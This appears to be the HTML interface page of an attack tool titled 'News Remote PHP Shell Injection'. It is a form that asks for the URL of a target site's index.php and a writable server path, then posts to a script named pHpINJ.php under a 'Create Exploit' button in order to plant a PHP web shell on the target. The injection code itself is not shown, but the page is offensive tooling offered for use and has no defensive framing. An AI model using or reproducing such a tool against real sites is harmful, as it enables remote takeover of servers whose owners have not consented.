<html>
<head>
<title>|| .::News Remote PHP Shell Injection::. ||   </title>
</head>
<body>
<header>||   .::News PHP Shell Injection::.   ||</header> <br /> <br />
Url to index.php: <br /> 
<form action = "/pHpINJ.php" method = "post">
<input type = "text" name = "url" value = "http://www.site.com/n13/index.php"; size = "50"> <br />
Server Path to Shell: <br />
Full server path to a writable file which will contain the Php Shell <br />
<input type = "text" name = "outfile" value = "/var/www/localhost/htdocs/n13/shell.php" size = "50"> <br /> <br />
<input type = "submit" value = "Create Exploit"> <br /> <br />



</body>
</html>